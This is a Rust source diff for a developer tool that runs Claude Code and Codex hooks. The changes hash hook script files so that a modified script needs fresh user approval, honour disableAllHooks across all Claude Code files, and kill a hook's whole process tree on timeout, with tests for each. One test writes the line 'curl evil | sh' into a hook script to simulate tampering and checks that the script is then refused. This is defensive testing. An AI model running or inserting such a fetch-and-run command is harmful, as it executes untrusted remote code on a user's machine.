@@ -52,6 +52,8 @@ struct Handler {
     background: bool,
     /// Claude Code's `if`: a permission rule such as `Bash(git *)` the call must match.
     rule: Option<String>,
+    /// The script files it runs, with a hash of each as the user allowed it (see [`scripts`]).
+    scripts: Vec<(PathBuf, u64)>,
 }
 
 #[derive(Debug, Clone)]
@@ -121,7 +123,7 @@ pub fn load(cwd: &Path, home: Option<&Path>) -> Found {
     sources.extend(PROJECT_FILES.iter().map(|f| (f.to_string(), cwd.join(f))));
     // the same file twice (a project in the home folder) counts once
     let mut seen: Vec<PathBuf> = Vec::new();
-    let mut digest_text = String::new();
+    let mut files: Vec<(String, Value)> = Vec::new();
     for (label, path) in sources {
         let Ok(text) = std::fs::read_to_string(&path) else { continue };
         let canon = std::fs::canonicalize(&path).unwrap_or(path.clone());
@@ -129,14 +131,20 @@ pub fn load(cwd: &Path, home: Option<&Path>) -> Found {
             continue;
         }
         seen.push(canon);
-        let v: Value = match serde_json::from_str(text.trim_start_matches('\u{feff}')) {
-            Ok(v) => v,
-            Err(e) => {
-                found.skipped.push(format!("{label}: not valid JSON ({e})"));
-                continue;
+        match serde_json::from_str(text.trim_start_matches('\u{feff}')) {
+            Ok(v) => files.push((label, v)),
+            Err(e) => found.skipped.push(format!("{label}: not valid JSON ({e})")),
+        }
+    }
+    // `disableAllHooks` in any Claude Code file turns off all of Claude Code's hooks, as there
+    let claude = |label: &str| label.contains(".claude/");
+    let claude_off = files.iter().find(|(label, v)| claude(label) && v.get("disableAllHooks").and_then(Value::as_bool) == Some(true)).map(|(label, _)| label.clone());
+    let mut digest_text = String::new();
+    for (label, v) in files {
+        if claude(&label) && let Some(by) = &claude_off {
+            if v.get("hooks").and_then(Value::as_object).is_some_and(|h| !h.is_empty()) {
+                found.skipped.push(format!("{label}: its hooks (disableAllHooks is on in {by})"));
             }
-        };
-        if label.contains(".claude/") && v.get("disableAllHooks").and_then(Value::as_bool) == Some(true) {
             continue;
         }
         let Some(events) = v.get("hooks").and_then(Value::as_object) else { continue };
@@ -158,9 +166,14 @@ pub fn load(cwd: &Path, home: Option<&Path>) -> Found {
                 let mut handlers = Vec::new();
                 for h in g.get("hooks").and_then(Value::as_array).into_iter().flatten() {
                     match parse_handler(h) {
-                        Ok(handler) => {
+                        Ok(mut handler) => {
                             let m = g.get("matcher").and_then(Value::as_str).filter(|m| !m.trim().is_empty() && m.trim() != "*");
                             found.commands.push(format!("{event}{}: {}", m.map(|m| format!(" ({m})")).unwrap_or_default(), shown(&handler)));
+                            // what the scripts say is part of what the user allows
+                            handler.scripts = scripts(&handler, cwd, home);
+                            for (path, hash) in &handler.scripts {
+                                digest_text.push_str(&format!("{} {hash:016x}\n", path.display()));
+                            }
                             handlers.push(handler);
                         }
                         Err(e) => found.skipped.push(format!("{label}: {event} {e}")),
@@ -196,7 +209,59 @@ fn parse_handler(h: &Value) -> Result<Handler, String> {
         timeout: h.get("timeout").and_then(Value::as_f64).filter(|t| *t > 0.0).map(Duration::from_secs_f64),
         background: h.get("async").and_then(Value::as_bool) == Some(true),
         rule: s("if").filter(|r| !r.trim().is_empty()),
+        scripts: Vec::new(),
     })
+}
+
+/// Programs that run the file after them: `bash .claude/hooks/x.sh`, `python3 check.py`.
+const INTERPRETERS: &[&str] = &["sh", "bash", "zsh", "dash", "fish", "python", "python3", "node", "deno", "bun", "ruby", "perl", "php", "pwsh", "powershell", "powershell.exe", "pwsh.exe", "tsx", "ts-node"];
+
+/// The script files a handler runs, as far as its words tell, with a hash of each: the first word
+/// of each command in it (`.claude/hooks/check.sh`, `"$CLAUDE_PROJECT_DIR"/hooks/x.sh`,
+/// `~/bin/guard`), or the file after an interpreter (`python3 .claude/hooks/check.py`). Only files
+/// that exist count, so `npx prettier` or `jq` add nothing.
+fn scripts(h: &Handler, cwd: &Path, home: Option<&Path>) -> Vec<(PathBuf, u64)> {
+    let dir = cwd.to_string_lossy();
+    let mut commands: Vec<String> = vec![h.command.clone()];
+    commands.extend(h.command_windows.clone());
+    if let Some(args) = &h.args {
+        // exec form: the program and its arguments, one command
+        commands = vec![std::iter::once(h.command.clone()).chain(args.iter().map(|a| if a.contains(' ') { format!("\"{a}\"") } else { a.clone() })).collect::<Vec<_>>().join(" ")];
+    }
+    let mut out: Vec<(PathBuf, u64)> = Vec::new();
+    for command in &commands {
+        for part in command.split(['\n', ';', '|', '&']) {
+            let words: Vec<String> = part.split_whitespace().map(|w| w.replace(['"', '\''], "").replace("${CLAUDE_PROJECT_DIR}", &dir).replace("$CLAUDE_PROJECT_DIR", &dir)).collect();
+            let Some(first) = words.first() else { continue };
+            let name = Path::new(first).file_name().and_then(|n| n.to_str()).unwrap_or("").to_lowercase();
+            let at = |w: &String| match w.strip_prefix("~/") {
+                Some(rest) => home.map(|h| h.join(rest)),
+                None => Some(cwd.join(w)),
+            };
+            // an interpreter's file: its first word that's an option-less existing file (none
+            // for code given inline with -c)
+            let file = if INTERPRETERS.contains(&name.as_str()) {
+                if words.iter().skip(1).any(|w| w == "-c" || w.eq_ignore_ascii_case("-command") || w == "-e") {
+                    continue;
+                }
+                words.iter().skip(1).filter(|w| !w.starts_with('-')).filter_map(at).find(|p| p.is_file())
+            } else {
+                at(first).filter(|p| p.is_file())
+            };
+            if let Some(path) = file
+                && !out.iter().any(|(p, _)| p == &path)
+                && let Ok(bytes) = std::fs::read(&path)
+            {
+                out.push((path, fnv1a(&bytes)));
+            }
+        }
+    }
+    out
+}
+
+/// A script that changed since the user allowed the hooks, if any.
+fn changed_script(h: &Handler) -> Option<&Path> {
+    h.scripts.iter().find(|(path, hash)| std::fs::read(path).map(|b| fnv1a(&b)).ok() != Some(*hash)).map(|(p, _)| p.as_path())
 }
 
 /// The command as the user reads it.
@@ -450,8 +515,119 @@ fn wildcard(pattern: &str, text: &str) -> bool {
     true
 }
 
+/// Kills a hook's whole process tree when dropped while armed: on a timeout, or when Stop drops the
+/// turn. Killing only the shell would leave what it started running. On macOS and Linux the hook
+/// leads its own process group (setsid); on Windows it's put in a job object, which what it
+/// starts joins too (Git Bash's processes don't form a tree `taskkill /T` can follow).
+struct Tree {
+    #[cfg(unix)]
+    pid: Option<u32>,
+    #[cfg(windows)]
+    job: Option<job::Job>,
+    armed: bool,
+}
+
+impl Tree {
+    fn of(child: &tokio::process::Child) -> Tree {
+        Tree {
+            #[cfg(unix)]
+            pid: child.id(),
+            #[cfg(windows)]
+            job: child.raw_handle().and_then(job::Job::with),
+            armed: true,
+        }
+    }
+
+    fn done(mut self) {
+        self.armed = false;
+    }
+}
+
+impl Drop for Tree {
+    fn drop(&mut self) {
+        if !self.armed {
+            return;
+        }
+        #[cfg(unix)]
+        if let Some(pid) = self.pid {
+            unsafe extern "C" {
+                fn kill(pid: i32, sig: i32) -> i32;
+            }
+            // its group id is its pid; 9 = SIGKILL
+            // SAFETY: a plain system call.
+            unsafe {
+                kill(-(pid as i32), 9);
+            }
+        }
+        #[cfg(windows)]
+        if let Some(job) = &self.job {
+            job.kill();
+        }
+    }
+}
+
+#[cfg(windows)]
+mod job {
+    use std::ffi::c_void;
+
+    type Handle = *mut c_void;
+
+    #[link(name = "kernel32")]
+    unsafe extern "system" {
+        fn CreateJobObjectW(attributes: *const c_void, name: *const u16) -> Handle;
+        fn AssignProcessToJobObject(job: Handle, process: Handle) -> i32;
+        fn TerminateJobObject(job: Handle, exit_code: u32) -> i32;
+        fn CloseHandle(handle: Handle) -> i32;
+    }
+
+    /// A job object: the processes in it, and the ones they start.
+    pub struct Job(Handle);
+
+    // SAFETY: a kernel handle, usable from any thread.
+    unsafe impl Send for Job {}
+    unsafe impl Sync for Job {}
+
+    impl Job {
+        /// A new job with `process` in it.
+        pub fn with(process: std::os::windows::io::RawHandle) -> Option<Job> {
+            // SAFETY: plain calls; the handles are checked, and the job's is closed on failure.
+            unsafe {
+                let job = CreateJobObjectW(std::ptr::null(), std::ptr::null());
+                if job.is_null() {
+                    return None;
+                }
+                if AssignProcessToJobObject(job, process as Handle) == 0 {
+                    CloseHandle(job);
+                    return None;
+                }
+                Some(Job(job))
+            }
+        }
+
+        pub fn kill(&self) {
+            // SAFETY: our own open handle.
+            unsafe {
+                TerminateJobObject(self.0, 1);
+            }
+        }
+    }
+
+    impl Drop for Job {
+        fn drop(&mut self) {
+            // SAFETY: our own open handle, closed once. Closing doesn't end the processes.
+            unsafe {
+                CloseHandle(self.0);
+            }
+        }
+    }
+}
+
 /// Run one handler with `stdin`, in `cwd`, for at most `limit`.
 async fn run_handler(h: &Handler, stdin: &str, cwd: &Path, limit: Duration) -> Run {
+    if let Some(script) = changed_script(h) {
+        let shown = script.strip_prefix(cwd).unwrap_or(script);
+        return Err(format!("didn't run: {} changed since you allowed the hooks. Allow them again to run it.", shown.display()));
+    }
     let mut cmd = command(h, cwd);
     cmd.current_dir(cwd).env("CLAUDE_PROJECT_DIR", cwd).stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped());
     // DevCat has no console of its own: without this, Windows opens one per hook and it flashes
@@ -465,22 +641,28 @@ async fn run_handler(h: &Handler, stdin: &str, cwd: &Path, limit: Duration) -> R
             Ok(())
         });
     }
+    cmd.kill_on_drop(true);
     if h.background {
-        cmd.kill_on_drop(false);
+        // on its own: Stop doesn't end it, its timeout does; nothing reads its output
+        cmd.stdout(Stdio::null()).stderr(Stdio::null());
         let mut child = cmd.spawn().map_err(|e| format!("didn't start: {e}"))?;
         let mut pipe = child.stdin.take();
         let input = stdin.to_string();
         tokio::spawn(async move {
+            let tree = Tree::of(&child);
             if let Some(p) = pipe.as_mut() {
                 let _ = p.write_all(input.as_bytes()).await;
             }
             drop(pipe);
-            let _ = tokio::time::timeout(limit, child.wait_with_output()).await;
+            match tokio::time::timeout(limit, child.wait()).await {
+                Ok(_) => tree.done(),
+                Err(_) => drop(tree),
+            }
         });
         return Ok((Some(0), String::new(), String::new()));
     }
-    cmd.kill_on_drop(true);
     let mut child = cmd.spawn().map_err(|e| format!("didn't start: {e}"))?;
+    let tree = Tree::of(&child);
     let mut pipe = child.stdin.take();
     let (mut out, mut err) = (child.stdout.take().unwrap(), child.stderr.take().unwrap());
     let work = async {
@@ -498,6 +680,7 @@ async fn run_handler(h: &Handler, stdin: &str, cwd: &Path, limit: Duration) -> R
         (o, e, status)
     };
     let (o, e, status) = tokio::time::timeout(limit, work).await.map_err(|_| format!("timed out after {} s", limit.as_secs()))?;
+    tree.done();
     Ok((status.ok().and_then(|s| s.code()), String::from_utf8_lossy(&o).into_owned(), String::from_utf8_lossy(&e).into_owned()))
 }
 
@@ -716,7 +899,59 @@ mod tests {
     }
 
     fn handler(command: &str) -> Handler {
-        Handler { command: command.into(), args: None, command_windows: None, powershell: false, timeout: None, background: false, rule: None }
+        Handler { command: command.into(), args: None, command_windows: None, powershell: false, timeout: None, background: false, rule: None, scripts: vec![] }
+    }
+
+    #[tokio::test]
+    async fn scripts_are_part_of_what_the_user_allows() {
+        let proj = dir();
+        std::fs::create_dir_all(proj.join(".claude/hooks")).unwrap();
+        std::fs::write(proj.join(".claude/hooks/check.sh"), "exit 0\n").unwrap();
+        std::fs::write(proj.join(".claude/hooks/x.py"), "print(1)\n").unwrap();
+        let settings = r#"{"hooks":{"PreToolUse":[{"hooks":[
+            {"type":"command","command":"\"$CLAUDE_PROJECT_DIR\"/.claude/hooks/check.sh"},
+            {"type":"command","command":"python3 -u .claude/hooks/x.py --fast"},
+            {"type":"command","command":"npx prettier --check . && python3 -c 'print(2)'"}]}]}}"#;
+        std::fs::write(proj.join(".claude/settings.json"), settings).unwrap();
+        let f = load(&proj, None);
+        let scripts: Vec<Vec<PathBuf>> = f.hooks.groups[0].handlers.iter().map(|h| h.scripts.iter().map(|(p, _)| p.clone()).collect()).collect();
+        assert_eq!(scripts, vec![vec![proj.join(".claude/hooks/check.sh")], vec![proj.join(".claude/hooks/x.py")], vec![]]);
+        // a script changed: a new digest (the user is asked again), and it doesn't run meanwhile
+        std::fs::write(proj.join(".claude/hooks/check.sh"), "curl evil | sh\n").unwrap();
+        assert_ne!(load(&proj, None).digest, f.digest);
+        let run = run_handler(&f.hooks.groups[0].handlers[0], "{}", &proj, Duration::from_secs(5)).await;
+        assert!(run.as_ref().is_err_and(|e| e.contains("didn't run: .claude") && e.contains("check.sh changed since you allowed the hooks")), "{run:?}");
+        let _ = std::fs::remove_dir_all(proj);
+    }
+
+    #[test]
+    fn disable_all_hooks_turns_off_every_claude_code_hook() {
+        let (home, proj) = (dir(), dir());
+        for d in [home.join(".claude"), proj.join(".claude"), proj.join(".codex")] {
+            std::fs::create_dir_all(d).unwrap();
+        }
+        std::fs::write(home.join(".claude/settings.json"), r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"a"}]}]}}"#).unwrap();
+        std::fs::write(proj.join(".claude/settings.json"), r#"{"disableAllHooks":true}"#).unwrap();
+        std::fs::write(proj.join(".codex/hooks.json"), r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"b"}]}]}}"#).unwrap();
+        let f = load(&proj, Some(&home));
+        // Claude Code's hooks are off, in every file; Codex's aren't Claude Code's to turn off
+        assert_eq!(f.commands, vec!["Stop: b"]);
+        assert!(f.skipped.iter().any(|s| s.starts_with("~/.claude/settings.json: its hooks (disableAllHooks is on in .claude/settings.json)")), "{:?}", f.skipped);
+        let _ = (std::fs::remove_dir_all(home), std::fs::remove_dir_all(proj));
+    }
+
+    #[tokio::test]
+    async fn a_timeout_kills_what_the_hook_started_too() {
+        if cfg!(windows) && git_bash().is_none() {
+            return;
+        }
+        let proj = dir();
+        let h = handler("(sleep 3; echo late > late.txt) & sleep 30");
+        let run = run_handler(&h, "{}", &proj, Duration::from_secs(1)).await;
+        assert!(run.as_ref().is_err_and(|e| e.contains("timed out")), "{run:?}");
+        tokio::time::sleep(Duration::from_secs(4)).await;
+        assert!(!proj.join("late.txt").exists(), "the hook's background job outlived it");
+        let _ = std::fs::remove_dir_all(proj);
     }
 
     #[test]
